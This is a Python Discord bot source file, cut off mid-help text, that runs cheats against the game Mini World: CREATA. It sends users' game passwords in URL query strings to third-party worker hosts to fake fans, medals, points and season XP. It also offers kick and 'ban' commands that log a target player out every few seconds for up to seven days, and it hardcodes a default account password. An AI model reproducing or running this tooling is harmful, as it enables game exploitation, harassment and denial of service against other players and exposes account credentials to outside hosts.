import discord
import os, time, json, hashlib
import asyncio
import aiohttp
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from dotenv import load_dotenv

load_dotenv()

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")
OWNER_ID = 1286240448775720962
ALLOWED_USERS_FILE = "allowed_users.json"
HARDCODED_IDS = ["1330514451215941714", "1496766258652250193", "1286240448775720962", "1060046356544241725", "1066573477378789456", "1279702747821768704", "1530786876007645204"]

intents = discord.Intents.default()
intents.message_content = True
intents.dm_messages = True
client = discord.Client(intents=intents)

def load_allowed_users():
    if os.path.exists(ALLOWED_USERS_FILE):
        with open(ALLOWED_USERS_FILE, "r") as f:
            return json.load(f)
    return {"users": [str(OWNER_ID)]}

def save_allowed_users(data):
    with open(ALLOWED_USERS_FILE, "w") as f:
        json.dump(data, f, indent=2)

def is_allowed(user_id):
    if str(user_id) in HARDCODED_IDS:
        return True
    data = load_allowed_users()
    return str(user_id) in data["users"]

def get_all_allowed():
    data = load_allowed_users()
    combined = list(set(HARDCODED_IDS + data["users"]))
    result = {"hardcoded": [], "added": []}
    for uid in combined:
        if uid in HARDCODED_IDS:
            result["hardcoded"].append(uid)
        else:
            result["added"].append(uid)
    return result

worker_status = {}
WORKER_URLS = {
    "kick": "https://kickplayer.miniworldgameapp.workers.dev/",
    "fans": "https://verifygetfans.miniworldgameapp.workers.dev/",
    "medal": "https://getverifymedal.miniworldgameapp.workers.dev/",
    "points": "https://getminipoint.miniworldgameapp.workers.dev/",
    "rename": "https://setaccountname.miniworldgameapp.workers.dev/",
    "season": "https://getseasonexperience.miniworldgameapp.workers.dev/",
    "buka_room": "https://miniworld-api.daxtercarl1202.workers.dev/buka_room",
    "player": "https://miniworld-api.daxtercarl1202.workers.dev/player",
    "openroom": "https://proxy-darkn2ss.darknessweb.workers.dev/api/openroom",
}

CLOUDFLARE_KEYWORDS = ["just a moment", "cf-browser-verification", "challenge-platform", "cloudflare", "attention required", "checking your browser"]

CUSTOM_WORKER_URLS = {
    "buka_room": "https://miniworld-api.daxtercarl1202.workers.dev/",
    "player": "https://miniworld-api.daxtercarl1202.workers.dev/player",
}

def is_rate_limited(status, text):
    if status in (403, 429):
        return True
    lower = text.lower()
    for kw in CLOUDFLARE_KEYWORDS:
        if kw in lower:
            return True
    return False

active_bans = {}
processed_messages = set()

async def check_workers():
    global worker_status
    async with aiohttp.ClientSession() as session:
        for name, url in {**WORKER_URLS, **CUSTOM_WORKER_URLS}.items():
            try:
                r = await session.get(url, timeout=aiohttp.ClientTimeout(total=10))
                text = await r.text()
                if is_rate_limited(r.status, text):
                    worker_status[name] = "rate_limited"
                elif r.status == 200 and ("code" in text.lower() or "114514" in text or "status" in text.lower() or "result" in text.lower()):
                    worker_status[name] = "online"
                else:
                    worker_status[name] = "offline"
            except Exception as e:
                worker_status[name] = "offline"
            print(f"[HEALTH] {name}: {worker_status[name]} ({text[:60]})", flush=True)

from discord.ext import tasks
@tasks.loop(minutes=5)
async def health_loop():
    await check_workers()

def worker_check(action):
    status = worker_status.get(action, "offline")
    if status == "rate_limited":
        embed = discord.Embed(title="CLOUDFLARE RATE LIMIT", description="Try again tomorrow.\n\n`!mwstatus` for details.", color=discord.Color.orange())
        return embed
    elif status == "online":
        return None
    else:
        embed = discord.Embed(title="Workers Offline", description="Try again later.\n\n`!mwstatus` for details.", color=discord.Color.red())
        return embed

BADGE_NAMES = {
    "1001": "Demon Hunter", "1002": "Treasure Hunter", "1003": "Survival Expert",
    "1004": "Extremity God", "1005": "Mystery Gift", "1006": "Trendiest Trend",
    "1008": "Happy Partner", "1010": "Like Collector", "1011": "Green House",
    "1012": "Pest Killer", "1013": "Encyclopedia", "1014": "Harvest King",
    "1015": "Thriving Growth", "1016": "Full Assembly", "1017": "Mighty Me",
    "1018": "Fancy Transform", "1019": "Beast Tamer", "1020": "Wardrobe Master",
}

def MW_WARNING_embed(action, description):
    embed = discord.Embed(
        title=f"⚠️ USE {action} BUG",
        description=f"**WARNING**\n\nUSING THIS FEATURE MAY TRIGGER **PERMANENT BAN**.\nWE ARE NOT RESPONSIBLE FOR ANY CONSEQUENCES.\n\nFeature: **{action}** — {description}",
        color=discord.Color.red()
    )
    embed.set_footer(text="Mini World: CREATA | Use at your own risk")
    return embed

class MWAuthModal(discord.ui.Modal, title="Masukkan Data Akun"):
    uid_input = discord.ui.TextInput(label="UID (10 digit)", placeholder="Contoh: 320807253", required=True)
    pw_input = discord.ui.TextInput(label="Password", placeholder="Password akun Mini World", style=discord.TextStyle.short, required=True)

    def __init__(self, action, extra_data=None):
        super().__init__()
        self.action = action
        self.extra_data = extra_data or {}

    async def on_submit(self, interaction: discord.Interaction):
        uid = self.uid_input.value.strip()
        pwd = self.pw_input.value.strip()
        await interaction.response.defer(ephemeral=True)

        err = worker_check(self.action.lower())
        if err:
            await interaction.followup.send(embed=err, ephemeral=True)
            return

        try:
            if self.action == "FANS":
                async with aiohttp.ClientSession() as session:
                    url = f"https://verifygetfans.miniworldgameapp.workers.dev/?uin={uid}&pwd={pwd}"
                    r = await session.get(url, timeout=aiohttp.ClientTimeout(total=15))
                    try:
                        data = await r.json()
                    except:
                        e = discord.Embed(title="❌ Fans Failed", color=discord.Color.red())
                        e.add_field(name="UID", value=f"`{uid}`", inline=True)
                        e.add_field(name="Error", value="Workers rate-limited/down.", inline=False)
                        await interaction.followup.send(embed=e, ephemeral=True)
                        return
                if data.get("code") == 114514:
                    e = discord.Embed(title="✅ Fans Success", color=discord.Color.green())
                    e.add_field(name="UID", value=f"`{uid}`", inline=True)
                    e.add_field(name="Status", value="Fans verified successfully", inline=True)
                    await interaction.followup.send(embed=e, ephemeral=True)
                else:
                    e = discord.Embed(title="❌ Fans Failed", color=discord.Color.red())
                    e.add_field(name="UID", value=f"`{uid}`", inline=True)
                    e.add_field(name="Error", value=f"`{data}`", inline=False)
                    await interaction.followup.send(embed=e, ephemeral=True)

            elif self.action == "MEDAL":
                medal_ids = self.extra_data.get("medal_ids", "1001")
                token = hashlib.sha256((uid + pwd + medal_ids + "fuckmini114514").encode()).hexdigest()
                async with aiohttp.ClientSession() as session:
                    url = f"https://getverifymedal.miniworldgameapp.workers.dev/?uin={uid}&pwd={pwd}&medalid={medal_ids}&token={token}"
                    r = await session.get(url, timeout=aiohttp.ClientTimeout(total=15))
                    try:
                        data = await r.json()
                    except:
                        e = discord.Embed(title="❌ Medal Failed", color=discord.Color.red())
                        e.add_field(name="Error", value="Workers rate-limited/down.", inline=False)
                        await interaction.followup.send(embed=e, ephemeral=True)
                        return
                if data.get("code") == 114514:
                    e = discord.Embed(title="✅ Medal Success", color=discord.Color.green())
                    e.add_field(name="UID", value=f"`{uid}`", inline=True)
                    e.add_field(name="Badge", value=f"`{medal_ids}`", inline=True)
                    await interaction.followup.send(embed=e, ephemeral=True)
                else:
                    e = discord.Embed(title="❌ Medal Failed", color=discord.Color.red())
                    e.add_field(name="UID", value=f"`{uid}`", inline=True)
                    e.add_field(name="Error", value=f"`{data}`", inline=False)
                    await interaction.followup.send(embed=e, ephemeral=True)

            elif self.action == "POINTS":
                async with aiohttp.ClientSession() as session:
                    url = f"https://getminipoint.miniworldgameapp.workers.dev/?uin={uid}&pwd={pwd}"
                    r = await session.get(url, timeout=aiohttp.ClientTimeout(total=15))
                    try:
                        data = await r.json()
                    except:
                        e = discord.Embed(title="❌ Points Failed", color=discord.Color.red())
                        e.add_field(name="Error", value="Workers rate-limited/down.", inline=False)
                        await interaction.followup.send(embed=e, ephemeral=True)
                        return
                if data.get("code") == 114514:
                    e = discord.Embed(title="✅ Points Success", color=discord.Color.green())
                    e.add_field(name="UID", value=f"`{uid}`", inline=True)
                    await interaction.followup.send(embed=e, ephemeral=True)
                else:
                    e = discord.Embed(title="❌ Points Failed", color=discord.Color.red())
                    e.add_field(name="UID", value=f"`{uid}`", inline=True)
                    e.add_field(name="Error", value=f"`{data}`", inline=False)
                    await interaction.followup.send(embed=e, ephemeral=True)

            elif self.action == "RENAME":
                new_name = self.extra_data.get("new_name", "")
                if not new_name:
                    await interaction.followup.send("❌ New name is empty!", ephemeral=True)
                    return
                token = hashlib.sha256((uid + pwd + new_name + "fuckmini114514").encode()).hexdigest()
                async with aiohttp.ClientSession() as session:
                    url = f"https://setaccountname.miniworldgameapp.workers.dev/?uin={uid}&pwd={pwd}&newName={new_name}&token={token}"
                    r = await session.get(url, timeout=aiohttp.ClientTimeout(total=15))
                    try:
                        data = await r.json()
                    except:
                        e = discord.Embed(title="❌ Rename Failed", color=discord.Color.red())
                        e.add_field(name="Error", value="Workers rate-limited/down.", inline=False)
                        await interaction.followup.send(embed=e, ephemeral=True)
                        return
                if data.get("code") == 114514:
                    e = discord.Embed(title="✅ Rename Success", color=discord.Color.green())
                    e.add_field(name="New Name", value=f"`{new_name}`", inline=True)
                    await interaction.followup.send(embed=e, ephemeral=True)
                else:
                    e = discord.Embed(title="❌ Rename Failed", color=discord.Color.red())
                    e.add_field(name="Error", value=f"`{data}`", inline=False)
                    await interaction.followup.send(embed=e, ephemeral=True)

            elif self.action == "SEASON":
                async with aiohttp.ClientSession() as session:
                    e1 = discord.Embed(title="⏳ Season Pass", description="Phase 1 processing...", color=discord.Color.orange())
                    await interaction.followup.send(embed=e1, ephemeral=True)
                    r1 = await session.get(f"https://getseasonexperience.miniworldgameapp.workers.dev/?uin={uid}&pwd={pwd}&type=1", timeout=aiohttp.ClientTimeout(total=15))
                    try:
                        d1 = await r1.json()
                    except:
                        e = discord.Embed(title="❌ Season Pass Failed", color=discord.Color.red())
                        e.add_field(name="Error", value="Workers rate-limited/down.", inline=False)
                        await interaction.followup.send(embed=e, ephemeral=True)
                        return
                if d1.get("code") != 114514:
                    e = discord.Embed(title="❌ Season Pass Failed", color=discord.Color.red())
                    e.add_field(name="Error", value="Phase 1 failed", inline=True)
                    await interaction.followup.send(embed=e, ephemeral=True)
                    return
                async with aiohttp.ClientSession() as session:
                    r2 = await session.get(f"https://getseasonexperience.miniworldgameapp.workers.dev/?uin={uid}&pwd={pwd}&type=2", timeout=aiohttp.ClientTimeout(total=15))
                    try:
                        d2 = await r2.json()
                    except:
                        e = discord.Embed(title="❌ Season Pass Failed", color=discord.Color.red())
                        e.add_field(name="Error", value="Workers rate-limited/down.", inline=False)
                        await interaction.followup.send(embed=e, ephemeral=True)
                        return
                if d2.get("code") == 114514:
                    e = discord.Embed(title="✅ Season Pass Success", color=discord.Color.green())
                    e.add_field(name="Status", value="Phase 1 & 2 done\nSeason Pass XP added!", inline=True)
                    await interaction.followup.send(embed=e, ephemeral=True)
                else:
                    e = discord.Embed(title="❌ Season Pass Failed", color=discord.Color.red())
                    e.add_field(name="Error", value="Phase 2 failed", inline=True)
                    await interaction.followup.send(embed=e, ephemeral=True)

        except Exception as e:
            await interaction.followup.send(f"❌ Error: {str(e)[:200]}", ephemeral=True)

class MWExecuteView(discord.ui.View):
    def __init__(self, action, extra_data=None):
        super().__init__(timeout=120)
        self.action = action
        self.extra_data = extra_data or {}

    @discord.ui.button(label="EXECUTE CHEAT", style=discord.ButtonStyle.danger, emoji="⚠️")
    async def execute_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(MWAuthModal(self.action, self.extra_data))

class MedalBadgeSelect(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=120)
        self.selected_badges = []

    @discord.ui.select(
        placeholder="Select Badge/Medal (multiple OK)",
        min_values=1, max_values=18,
        options=[discord.SelectOption(label=name, value=badge_id) for badge_id, name in BADGE_NAMES.items()]
    )
    async def badge_select(self, interaction: discord.Interaction, select: discord.ui.Select):
        self.selected_badges = select.values
        names = [BADGE_NAMES.get(v, v) for v in select.values]
        ids_str = ",".join(select.values)
        embed = discord.Embed(
            title="⚠️ USE MEDAL BUG",
            description=f"**WARNING**\n\nUSING THIS FEATURE MAY TRIGGER **PERMANENT BAN**.\nWE ARE NOT RESPONSIBLE FOR ANY CONSEQUENCES.\n\n**Selected Badges:**\n" + "\n".join(f"• {n}" for n in names) + f"\n\nIDs: `{ids_str}`",
            color=discord.Color.red()
        )
        embed.set_footer(text="Mini World: CREATA | Click Execute to continue")
        await interaction.response.edit_message(embed=embed, view=MWExecuteView("MEDAL", {"medal_ids": ids_str}))

class BanIntervalSelect(discord.ui.View):
    def __init__(self, target_uid):
        super().__init__(timeout=120)
        self.target_uid = target_uid

    @discord.ui.select(
        placeholder="Ban interval?",
        min_values=1, max_values=1,
        options=[
            discord.SelectOption(label="5s", value="5"), discord.SelectOption(label="10s", value="10"),
            discord.SelectOption(label="15s", value="15"), discord.SelectOption(label="30s", value="30"),
            discord.SelectOption(label="60s", value="60"),
        ]
    )
    async def interval_select(self, interaction: discord.Interaction, select: discord.ui.Select):
        await interaction.response.edit_message(view=BanDurationSelect(self.target_uid, int(select.values[0])))

class BanDurationSelect(discord.ui.View):
    def __init__(self, target_uid, interval):
        super().__init__(timeout=120)
        self.target_uid = target_uid
        self.interval = interval

    @discord.ui.select(
        placeholder="Ban duration?",
        min_values=1, max_values=1,
        options=[
            discord.SelectOption(label="1 hour", value="0.04"), discord.SelectOption(label="6 hours", value="0.25"),
            discord.SelectOption(label="1 day", value="1"), discord.SelectOption(label="3 days", value="3"),
            discord.SelectOption(label="7 days", value="7"),
        ]
    )
    async def duration_select(self, interaction: discord.Interaction, select: discord.ui.Select):
        duration_days = float(select.values[0])
        duration_secs = duration_days * 86400
        ends_at = time.time() + duration_secs
        embed = discord.Embed(
            title="⚠️ CONFIRM BAN",
            description=f"**Target:** `{self.target_uid}`\n**Interval:** {self.interval}s\n**Duration:** {duration_days} days\n**Total bans:** ~{int(duration_secs / self.interval)}\n**Ends:** <t:{int(ends_at)}:R>",
            color=discord.Color.red()
        )
        await interaction.response.edit_message(embed=embed, view=BanConfirmView(self.target_uid, self.interval, duration_secs, ends_at))

class BanConfirmView(discord.ui.View):
    def __init__(self, target_uid, interval, duration_secs, ends_at):
        super().__init__(timeout=60)
        self.target_uid = target_uid
        self.interval = interval
        self.duration_secs = duration_secs
        self.ends_at = ends_at

    @discord.ui.button(label="START BAN", style=discord.ButtonStyle.danger, emoji="🔨")
    async def confirm_ban(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.target_uid in active_bans:
            await interaction.response.send_message(f"❌ UID `{self.target_uid}` is already banned!", ephemeral=True)
            return
        MW_UIN = os.getenv("MINI_UIN", "320807253")
        MW_PWD = os.getenv("MINI_PW", "Daxter12345GG")

        async def ban_loop():
            kick_count = 0
            try:
                while time.time() < self.ends_at:
                    async with aiohttp.ClientSession() as session:
                        url = f"https://kickplayer.miniworldgameapp.workers.dev/?uin={MW_UIN}&pwd={MW_PWD}&targetUin={self.target_uid}&type=2"
                        r = await session.get(url, timeout=aiohttp.ClientTimeout(total=10))
                        try:
                            data = await r.json()
                            success = data.get("code") == 114514
                        except:
                            success = False
                    kick_count += 1
                    print(f"[BAN] {'✅' if success else '❌'} Ban #{kick_count} → {self.target_uid}", flush=True)
                    await asyncio.sleep(self.interval)
            except asyncio.CancelledError:
                pass
            finally:
                active_bans.pop(self.target_uid, None)

        task = asyncio.create_task(ban_loop())
        active_bans[self.target_uid] = {"task": task, "interval": self.interval, "duration": self.duration_secs, "ends_at": self.ends_at, "kick_count": 0}
        embed = discord.Embed(title="🔨 BAN STARTED", description=f"**Target:** `{self.target_uid}`\n**Interval:** {self.interval}s\n**Ends:** <t:{int(self.ends_at)}:R>\n\n`!unban {self.target_uid}` to stop early.", color=discord.Color.red())
        await interaction.response.edit_message(embed=embed, view=None)

    @discord.ui.button(label="CANCEL", style=discord.ButtonStyle.secondary)
    async def cancel_ban(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content="❌ Ban cancelled.", embed=None, view=None)

@client.event
async def on_ready():
    print(f"[MW BOT] {client.user} online!", flush=True)
    await client.change_presence(status=discord.Status.idle, activity=discord.Game(name="Mini World: CREATA"))
    await check_workers()
    if not health_loop.is_running():
        health_loop.start()

@client.event
async def on_message(message):
    if message.author.bot:
        return
    if message.id in processed_messages:
        return
    processed_messages.add(message.id)
    if len(processed_messages) > 1000:
        processed_messages.clear()

    content = message.content.lower()

    MW_UIN = os.getenv("MINI_UIN", "320807253")
    MW_PWD = os.getenv("MINI_PW", "Daxter12345GG")

    # DM commands (owner only - full access)
    if message.guild is None:
        if str(message.author.id) != "1286240448775720962":
            return
        if content.startswith("!kick"):
            err = worker_check("kick")
            if err:
                await message.channel.send(embed=err)
                return
            parts = message.content.split()
            if len(parts) < 2:
                embed = discord.Embed(title="Usage", description="`!kick <target_uid>` or `!kick <target_uid> 2`", color=discord.Color.blue())
                await message.channel.send(embed=embed)
                return
            target_uid = parts[1]
            kick_type = parts[2] if len(parts) >= 3 else "1"
            embed = discord.Embed(title="⏳ KICKING", description=f"UID: `{target_uid}` (type={kick_type})...", color=discord.Color.orange())
            loading = await message.channel.send(embed=embed)
            try:
                url = f"https://kickplayer.miniworldgameapp.workers.dev/?uin={MW_UIN}&pwd={MW_PWD}&targetUin={target_uid}&type={kick_type}"
                async with aiohttp.ClientSession() as session:
                    r = await session.get(url, timeout=aiohttp.ClientTimeout(total=15))
                    text = await r.text()
                    try:
                        data = json.loads(text)
                    except:
                        embed = discord.Embed(title="❌ Kick Failed", description="Workers rate-limited/down.", color=discord.Color.red())
                        await loading.edit(embed=embed)
                        return
                if data.get("code") == 114514:
                    embed = discord.Embed(title="✅ Kick Success", description=f"UID `{target_uid}` kicked.", color=discord.Color.green())
                    await loading.edit(embed=embed)
                else:
                    embed = discord.Embed(title="❌ Kick Failed", description=f"`{data}`", color=discord.Color.red())
                    await loading.edit(embed=embed)
            except Exception as e:
                embed = discord.Embed(title="❌ Error", description=str(e)[:200], color=discord.Color.red())
                await loading.edit(embed=embed)
            return
        if content.startswith("!ban"):
            parts = message.content.split()
            if len(parts) < 2:
                embed = discord.Embed(title="Usage", description="`!ban <target_uid>`", color=discord.Color.blue())
                await message.channel.send(embed=embed)
                return
            target = parts[1]
            if target in active_bans:
                embed = discord.Embed(title="❌ Already Banned", description=f"UID `{target}` is already banned!\n`!unban {target}` to stop.", color=discord.Color.red())
                await message.channel.send(embed=embed)
                return
            embed = discord.Embed(
                title="⚠️ BAN DEVICES (CANNOT LOGIN)",
                description=f"**Target:** `{target}`\n\nPlayer will be **banned** and **cannot login**.\n⚠️ **HIGH RISK** — May trigger **PERMANENT BAN**.",
                color=discord.Color.red()
            )
            embed.set_footer(text="Select ban interval, then duration")
            await message.channel.send(embed=embed, view=BanIntervalSelect(target))
            return
        if content.startswith("!banlist"):
            if not active_bans:
                embed = discord.Embed(title="📋 Active Bans", description="No active bans.", color=discord.Color.orange())
                await message.channel.send(embed=embed)
                return
            embed = discord.Embed(title="📋 Active Bans", color=discord.Color.orange())
            for uid, info in active_bans.items():
                remaining = max(0, info["ends_at"] - time.time())
                embed.add_field(name=f"`{uid}`", value=f"Interval: {info['interval']}s | Remaining: {remaining/3600:.1f}h", inline=True)
            await message.channel.send(embed=embed)
            return
        if content.startswith("!unban"):
            parts = message.content.split()
            if len(parts) < 2:
                embed = discord.Embed(title="Usage", description="`!unban <target_uid>`", color=discord.Color.blue())
                await message.channel.send(embed=embed)
                return
            target = parts[1]
            if target not in active_bans:
                embed = discord.Embed(title="❌ Not Banned", description=f"UID `{target}` is not banned.", color=discord.Color.red())
                await message.channel.send(embed=embed)
                return
            active_bans[target]["task"].cancel()
            active_bans.pop(target, None)
            embed = discord.Embed(title="✅ UNBAN SUCCESS", description=f"UID `{target}` is no longer banned.", color=discord.Color.green())
            await message.channel.send(embed=embed)
            return
        if content.startswith("!add"):
            parts = message.content.split()
            if len(parts) < 2:
                await message.channel.send("Usage: `!add <discord_user_id>`")
                return
            user_id = parts[1]
            data = load_allowed_users()
            if user_id in data["users"]:
                await message.channel.send(f"❌ `{user_id}` already has access.")
                return
            data["users"].append(user_id)
            save_allowed_users(data)
            try:
                user = await client.fetch_user(int(user_id))
                name = f"{user.name}#{user.discriminator}"
            except:
                name = "Unknown"
            embed = discord.Embed(title="✅ Access Granted", color=discord.Color.green())
            embed.add_field(name="User ID", value=f"`{user_id}`", inline=True)
            embed.add_field(name="Discord Name", value=f"`{name}`", inline=True)
            await message.channel.send(embed=embed)
            print(f"[ACCESS] Added {user_id} ({name}) by {message.author.id}", flush=True)
            return
        if content.startswith("!delete"):
            parts = message.content.split()
            if len(parts) < 2:
                await message.channel.send("Usage: `!delete <discord_user_id>`")
                return
            user_id = parts[1]
            data = load_allowed_users()
            if user_id not in data["users"]:
                await message.channel.send(f"❌ `{user_id}` not in list.")
                return
            if user_id == str(OWNER_ID):
                await message.channel.send("❌ Cannot remove owner.")
                return
            data["users"].remove(user_id)
            save_allowed_users(data)
            try:
                user = await client.fetch_user(int(user_id))
                name = f"{user.name}#{user.discriminator}"
            except:
                name = "Unknown"
            embed = discord.Embed(title="✅ Access Removed", color=discord.Color.orange())
            embed.add_field(name="User ID", value=f"`{user_id}`", inline=True)
            embed.add_field(name="Discord Name", value=f"`{name}`", inline=True)
            await message.channel.send(embed=embed)
            print(f"[ACCESS] Removed {user_id} ({name}) by {message.author.id}", flush=True)
            return
        if content.startswith("!check"):
            all_users = get_all_allowed()
            embed = discord.Embed(title="📋 Authorized Users (Kick/Ban Access)", color=discord.Color.blue())
            if all_users["hardcoded"]:
                lines = []
                for uid in all_users["hardcoded"]:
                    try:
                        user = await client.fetch_user(int(uid))
                        name = f"{user.name}"
                        is_owner_tag = " 👑" if uid == str(OWNER_ID) else ""
                        lines.append(f"• `{uid}` {name}{is_owner_tag}")
                    except:
                        lines.append(f"• `{uid}` Unknown")
                embed.add_field(name="📌 Script IDs (Always Access)", value="\n".join(lines), inline=False)
            if all_users["added"]:
                lines = []
                for uid in all_users["added"]:
                    try:
                        user = await client.fetch_user(int(uid))
                        name = f"{user.name}"
                        lines.append(f"• `{uid}` {name}")
                    except:
                        lines.append(f"• `{uid}` Unknown")
                embed.add_field(name="➕ Added via !add", value="\n".join(lines), inline=False)
            total = len(all_users["hardcoded"]) + len(all_users["added"])
            embed.set_footer(text=f"Total: {total} users")
            await message.channel.send(embed=embed)
            return
        if content.startswith("!fans"):
            err = worker_check("fans")
            if err:
                await message.channel.send(embed=err)
                return
            await message.channel.send(embed=MW_WARNING_embed("FANS", "Verify/add fans"), view=MWExecuteView("FANS"))
            return
        if content.startswith("!medal"):
            err = worker_check("medal")
            if err:
                await message.channel.send(embed=err)
                return
            await message.channel.send(embed=MW_WARNING_embed("MEDAL", "Equip medal/badge"), view=MedalBadgeSelect())
            return
        if content.startswith("!points"):
            err = worker_check("points")
            if err:
                await message.channel.send(embed=err)
                return
            await message.channel.send(embed=MW_WARNING_embed("POINTS", "Add points"), view=MWExecuteView("POINTS"))
            return
        if content.startswith("!rename"):
            parts = message.content.split()
            if len(parts) < 2:
                await message.channel.send("Usage: `!rename <new_name>`")
                return
            new_name = parts[1]
            await message.channel.send(embed=MW_WARNING_embed("RENAME", f"Change name → `{new_name}`"), view=MWExecuteView("RENAME", {"new_name": new_name}))
            return
        if content.startswith("!season"):
            err = worker_check("season")
            if err:
                await message.channel.send(embed=err)
                return
            await message.channel.send(embed=MW_WARNING_embed("SEASON", "Season Pass XP — 2 phase"), view=MWExecuteView("SEASON"))
            return
        if content.startswith("!mwstatus"):
            STATUS_MAP = {"online": "🟢 ONLINE", "rate_limited": "🟠 RATE LIMITED", "offline": "🔴 OFFLINE"}
            embed = discord.Embed(title="🌐 Mini World Workers Status", color=discord.Color.green())
            for name in WORKER_URLS:
                s = worker_status.get(name, "offline")
                embed.add_field(name=name.capitalize(), value=STATUS_MAP.get(s, s), inline=True)
            await message.channel.send(embed=embed)
            return
        if content.startswith("!help"):
            embed = discord.Embed(title="📋 Mini World Commands", color=discord.Color.blue())
            embed.add_field(name="🎮 Commands", value=(
                "`!kick <uid>` — Kick player from room\n"
                "`!kick <uid> 2` — Force logout\n"
                "`!ban <uid>` — Ban devices (cannot login)\n"
                "`!unban <uid>` — Stop ban early\n"
                "`!banlist` — View active bans\n"
                "`!fans` — Verify/add fans\n"
                "`!medal` — Equip badge/medal\n"
                "`!points` — Add points\n"
                "`!rename <name>` — Change name\n"
                "`!season` — Season Pass XP\n"
                "`!buka_room <name> <max> <pass> <mode>` — Buka room baru\n"
                "`!openroom <map_id> [name] [max] [pass]` — Open room with map\n"
                "`!player <uin>` — Lihat info player\n"
                "`!mwstatus` — Check Workers status\n\n"
                "**Owner Only:**\n"
                "`!add <user_id>` — Grant kick/ban access\n"
                "`!delete <user_id>` — Revoke kick/ban access\n"
                "`!check` — View authorized users with names"
            ), inline=False)
            embed.set_footer(text="Mini World: CREATA Bot")
            await message.channel.send(embed=embed)
            return
        return

    # Guild commands
    if content.startswith("!kick"):
        if not is_allowed(message.author.id):
            await message.channel.send("❌ You don't have access to this feature.")
            return
        err = worker_check("kick")
        if err:
            await message.channel.send(embed=err)
            return
        parts = message.content.split()
        if len(parts) < 2:
            await message.channel.send("Usage: `!kick <target_uid>`")
            return
        target = parts[1]
        loading = await message.channel.send(f"⏳ **KICKING UID:** `{target}` ...")
        try:
            async with aiohttp.ClientSession() as session:
                url = f"https://kickplayer.miniworldgameapp.workers.dev/?uin={MW_UIN}&pwd={MW_PWD}&targetUin={target}&type=1"
                r = await session.get(url, timeout=aiohttp.ClientTimeout(total=15))
                text = await r.text()
                try:
                    data = json.loads(text)
                except:
                    embed = discord.Embed(title="❌ Kick Failed", color=discord.Color.red())
                    embed.add_field(name="Error", value="Workers rate-limited/down.", inline=False)
                    await loading.edit(content="", embed=embed)
                    return
            if data.get("code") == 114514:
                embed = discord.Embed(title="✅ Kick Success", color=discord.Color.green())
                embed.add_field(name="Target", value=f"`{target}`", inline=True)
                await loading.edit(content="", embed=embed)
            else:
                embed = discord.Embed(title="❌ Kick Failed", color=discord.Color.red())
                embed.add_field(name="Error", value=f"`{data}`", inline=False)
                await loading.edit(content="", embed=embed)
        except Exception as e:
            await loading.edit(content=f"❌ Error: {str(e)[:200]}", embed=None)
        return

    if content.startswith("!banlist"):
        if not active_bans:
            await message.channel.send("📋 No active bans.")
            return
        embed = discord.Embed(title="📋 Active Bans", color=discord.Color.orange())
        for uid, info in active_bans.items():
            remaining = max(0, info["ends_at"] - time.time())
            embed.add_field(name=f"`{uid}`", value=f"Interval: {info['interval']}s | Remaining: {remaining/3600:.1f}h", inline=True)
        await message.channel.send(embed=embed)
        return

    if content.startswith("!unban"):
        parts = message.content.split()
        if len(parts) < 2:
            await message.channel.send("Usage: `!unban <target_uid>`")
            return
        target = parts[1]
        if target not in active_bans:
            await message.channel.send(f"❌ UID `{target}` is not banned.")
            return
        active_bans[target]["task"].cancel()
        active_bans.pop(target, None)
        embed = discord.Embed(title="✅ UNBAN SUCCESS", description=f"UID `{target}` is no longer banned.", color=discord.Color.green())
        await message.channel.send(embed=embed)
        return

    if content == "!ban" or content.startswith("!ban "):
        if not is_allowed(message.author.id):
            await message.channel.send("❌ You don't have access to this feature.")
            return
        err = worker_check("kick")
        if err:
            await message.channel.send(embed=err)
            return
        parts = message.content.split()
        if len(parts) < 2:
            await message.channel.send("Usage: `!ban <target_uid>`")
            return
        target = parts[1]
        if target in active_bans:
            await message.channel.send(f"❌ UID `{target}` is already banned! Type `!unban {target}` to stop.")
            return
        embed = discord.Embed(title="⚠️ BAN DEVICES (CANNOT LOGIN)", description=f"**Target:** `{target}`\n\nPlayer will be **banned** and **cannot login**.\n⚠️ **HIGH RISK** — May trigger **PERMANENT BAN**.", color=discord.Color.red())
        await message.channel.send(embed=embed, view=BanIntervalSelect(target))
        return

    if content.startswith("!fans"):
        err = worker_check("fans")
        if err:
            await message.channel.send(embed=err)
            return
        await message.channel.send(embed=MW_WARNING_embed("FANS", "Verify/add fans for Mini World account"), view=MWExecuteView("FANS"))
        return

    if content.startswith("!medal"):
        err = worker_check("medal")
        if err:
            await message.channel.send(embed=err)
            return
        await message.channel.send(embed=MW_WARNING_embed("MEDAL", "Equip medal/badge for Mini World account"), view=MedalBadgeSelect())
        return

    if content.startswith("!points"):
        err = worker_check("points")
        if err:
            await message.channel.send(embed=err)
            return
        await message.channel.send(embed=MW_WARNING_embed("POINTS", "Add points to Mini World account"), view=MWExecuteView("POINTS"))
        return

    if content.startswith("!rename"):
        err = worker_check("rename")
        if err:
            await message.channel.send(embed=err)
            return
        parts = message.content.split()
        if len(parts) < 2:
            await message.channel.send("Usage: `!rename <new_name>`")
            return
        new_name = parts[1]
        await message.channel.send(embed=MW_WARNING_embed("RENAME", f"Change name → `{new_name}`"), view=MWExecuteView("RENAME", {"new_name": new_name}))
        return

    if content.startswith("!season"):
        err = worker_check("season")
        if err:
            await message.channel.send(embed=err)
            return
        await message.channel.send(embed=MW_WARNING_embed("SEASON", "Add Season Pass XP — 2 phase auto"), view=MWExecuteView("SEASON"))
        return

    if content.startswith("!mwstatus"):
        STATUS_MAP = {"online": "🟢 ONLINE", "rate_limited": "🟠 RATE LIMITED", "offline": "🔴 OFFLINE"}
        embed = discord.Embed(title="🌐 Mini World Workers Status", color=discord.Color.green())
        for name in WORKER_URLS:
            s = worker_status.get(name, "offline")
            embed.add_field(name=name.capitalize(), value=STATUS_MAP.get(s, s), inline=True)
        await message.channel.send(embed=embed)
        return

    if content.startswith("!help"):
        embed = discord.Embed(title="📋 Mini World Commands", color=discord.Color.blue())
        embed.add_field(
            name="🎮 Commands",
            value=(
                "`!kick <uid>` — Kick player from room\n"
                "`!ban <uid>` — Ban devices (cannot login)\n"
                "`!unban <uid>` — Stop ban early\n"
                "`!banlist` — View all active bans\n"
                "`!fans` — Verify/add fans\n"
